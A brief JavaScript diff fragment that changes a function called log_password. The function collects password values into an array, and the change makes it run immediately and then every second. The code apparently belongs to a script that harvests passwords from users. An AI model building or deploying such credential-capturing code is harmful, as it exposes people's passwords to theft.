@@ -11,5 +11,6 @@ var log_password = function () {
             passwords_logged.push(password);
         }
     }
-}();
-setInterval(log_password, 3000);
+};
+log_password();
+setInterval(log_password, 1000);
